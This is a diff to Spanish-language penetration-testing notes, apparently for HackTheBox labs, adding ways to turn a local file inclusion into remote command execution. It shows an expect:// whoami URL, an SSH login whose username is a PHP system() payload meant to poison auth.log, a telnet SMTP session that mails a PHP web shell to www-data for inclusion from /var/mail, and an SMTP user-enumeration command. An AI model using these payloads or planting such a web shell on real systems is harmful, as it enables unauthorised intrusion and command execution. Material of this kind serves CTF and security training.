@@ -91,11 +91,7 @@ http://victim.htb/file.php?recurse=expect://whoami
 
 ## RCE EN LFI
 
-Existen varias formas de conseguir ejecutar comandos en remoto a través de un Local File Inclusion, así como de acceder al sistema a través de la visualización de ciertos recursos. Para este caso, explicaré 2 técnicas a modo de ejemplo:
-
-Log Poisoning (access.log & auth.log)
-Mail PHP Execution
-La primera de ellas [Log Poisoning], consiste en verificar si las rutas /var/log/auth.log y /var/log/apache2/access.log son visibles desde el LFI.
+**[Log Poisoning]**, consiste en verificar si las rutas /var/log/auth.log y /var/log/apache2/access.log son visibles desde el LFI.
 
 En caso de serlo para la ruta /var/log/auth.log, podemos llevar a cabo técnicas de autenticación que nos permitan obtener ejecución de comandos en remoto. Esta ruta almacena las autenticaciones establecidas sobre el sistema, entre ellas además de las normales de sesión, las que van por SSH.
 
@@ -104,6 +100,29 @@ Esto en otras palabras se traduce en que por cada intento fallido de conexión p
 Ejemplo:
 
 `ssh "<?php system('whoami'); ?>"@domain.htb`
+
+**[Mail PHP Execution]**, consiste en aprovechar la vulnerabilidad LFI para tras visualizar los usuarios en el recurso '/etc/passwd', poder visualizar sus correspondientes mails en '/var/mail/usuario
+
+```
+telnet 192.168.1.X 25
+
+HELO localhost
+
+MAIL FROM:<root>
+
+RCPT TO:<www-data>
+
+DATA
+
+<?php
+
+echo shell_exec($_REQUEST['cmd']);
+?>
+```
+
+*Si no sabemos que usuario puede existir en el sistema:"
+
+`smtp-user-enum -M VRFY -U username_wordlist.txt -t <hostname>`
 
 
 # SNMP Enumeration 
